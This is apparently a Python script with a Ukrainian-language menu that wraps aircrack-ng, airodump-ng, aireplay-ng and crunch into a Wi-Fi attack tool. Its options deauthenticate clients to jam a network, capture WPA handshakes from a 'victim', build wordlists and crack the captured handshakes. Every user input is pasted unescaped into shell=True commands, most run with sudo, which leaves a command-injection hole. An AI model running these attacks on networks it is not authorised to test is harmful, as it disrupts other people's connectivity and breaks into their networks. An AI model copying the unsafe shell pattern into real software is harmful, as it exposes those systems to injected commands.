#!/usr/bin/env python3

import subprocess
import os

logo = '''
██████╗  █████╗ ██╗    ██╗██╗   ██╗██╗  ██╗
██╔══██╗██╔══██╗██║    ██║██║   ██║██║ ██╔╝
██████╔╝███████║██║ █╗ ██║██║   ██║█████╔╝
██╔═══╝ ██╔══██║██║███╗██║██║   ██║██╔═██╗
██║     ██║  ██║╚███╔███╔╝╚██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝
                                розроблено RazorBoyOne'ом\n
'''


def menu():
	main_choice = '''
   1) 🔎 Увімкнути режим моніторингу (Обов'язково)
   2) ❌ Вимкнути режим моніторингу
   3) ᯤ Сканувати безпровідні мережі
   4) 📱 Сканувати девайси, підключені до мережі
   5) 💀 Заглушити Wi-Fi мережу
   6) 🛠  Встановити додаткові інструменти
   7) 🤝 Перехопити рукостискання
   8) 🖊  Створити словник
   9) 🔓 Взломати рукостискання за допомогою словнику

   0) ❌ Вийти
   '''

	main_menu = logo + "\n\n" + main_choice + "\n\n"
	subprocess.call("clear", shell=True)
	print(main_menu)


def clear_logo():
	subprocess.call("clear", shell=True)
	print(logo)

def clear_logo_interface():
	subprocess.call("clear", shell=True)
	print(logo)

	print("-"*80 + "\n")
	subprocess.call("iwconfig", shell=True)
	print("-"*80)




def main_wifi_hack():
	while True:
		menu()
		user_choice = input(" Введіть номер операції: ")

		if user_choice == "1":
			clear_logo_interface()

			iface_value = input(" \nВведіть номер інтерфейсу: ")

			subprocess.call(f"sudo airmon-ng start {iface_value}", shell=True)

		elif user_choice == "2":
			clear_logo_interface()

			iface_value = input(" \nВведіть номер інтерфейсу: ")

			subprocess.call(f"sudo airmon-ng stop {iface_value}", shell=True)

		elif user_choice == "3":
			clear_logo_interface()

			iface_value = input(" \nВведіть номер інтерфейсу: ")

			clear_logo()
			subprocess.call(f"sudo airodump-ng {iface_value}", shell=True)

		elif user_choice == "4":
			clear_logo_interface()

			iface_value = input(" \nВведіть номер інтерфейсу: ")
			bssid = input("Введіть BSSID: ")
			channel = input("Введіть Channel: ")

			subprocess.call(f"sudo airodump-ng --bssid {bssid} --channel {channel} {iface_value}", shell=True)



		elif user_choice == "5":
			clear_logo_interface()

			iface_value = input(" \nВведіть номер інтерфейсу: ")
			bssid = input("Введіть BSSID: ")
			mac_client = input("Введіть MAC-адресу клієнта: ")
			packet_value = input("Введіть кількість пакетів: (1000000)")

			clear_logo()
			subprocess.call(f"sudo aireplay-ng --deauth {packet_value} -a {bssid} -c {mac_client} {iface_value}", shell=True)


		elif user_choice == "6":
			apt_menu = '''   1) Aircrack-ng (Необхідний)\n   2) Crunch (Необхідний)\n   3) Reaver\n   4) Wifite2\n   5) Wireshark\n   0) Вийти'''

			apt_print = logo + "\n\n" + apt_menu + "\n\n"

			subprocess.call("clear", shell=True)
			print(apt_print)

			apt_choice = input(" Введіть номер операції: ")

			if apt_choice == "1":
				clear_logo()

				subprocess.call("sudo apt update && sudo apt install aircrack-ng", shell=True)

			elif apt_choice == "2":
				clear_logo()

				subprocess.call("sudo apt update && sudo apt install crunch", shell=True)

			elif apt_choice == "3":
				clear_logo()

				subprocess.call("sudo apt update && sudo apt install reaver", shell=True)

			elif apt_choice == "4":
				clear_logo()

				subprocess.call("sudo apt update && sudo apt install wifite", shell=True)

			elif apt_choice == "5":
				clear_logo()

				subprocess.call("sudo apt update && sudo apt install wireshark", shell=True)

			elif apt_choice == "0":
				exit()

			else:
				print("[-] Невідома команда!")



		elif user_choice == "7":
			#
			clear_logo()

			half_choice = input("Введіть кількість терміналів (1, 2): ")

			if half_choice == "1":
				clear_logo_interface()

				iface_value = input(" \nВведіть інтерфейс: ")
				bssid = input(" Введіть BSSID: ")
				channel = input(" Введіть канал: ")

				subprocess.call(f"sudo airodump-ng -c {channel} --bssid {bssid} -w handshakes/{bssid} {iface_value}", shell=True)

			elif half_choice == "2":
				clear_logo_interface()

				iface_value = input(" \nВведіть інтерфейс: ")
				bssid = input(" Введіть BSSID: ")
				victim_mac = input(" Введіть MAC-адресу жертви: ")

				subprocess.call(f"aireplay-ng -0 1 -a {bssid} -c {victim_mac} {iface_value}", shell=True)

			else:
				print(" [-] Невідома команда!")



		elif user_choice == "8":
			clear_logo()

			min_val = input(" Введіть МІНІМАЛЬНУ кількість символів: ")
			max_val = input(" Введіть МАКСИМАЛЬНУ кількість символів: ")
			words = input(" Введіть символи або числа: ")
			filename = input(" Введіть назву файлу для збереження: ")

			print()
			subprocess.call(f"crunch {min_val} {max_val} {words} -o wordlists/{filename}", shell=True)

			print(f"\n[+] Файл збережений у: wordlists/{filename}\n")

		elif user_choice == "9":
			clear_logo()

			wordlist = input(" Введіть шлях до словника: ")
			handshake = input(" Введіть шлях до рукостискання: ")

			print("\n")
			subprocess.call(f"sudo aircrack-ng -w {wordlist} {handshake}", shell=True)



		elif user_choice == "0":
			exit()

		else:
			print("[-] Невідома команда!")



if __name__ == "__main__":
	main_wifi_hack()
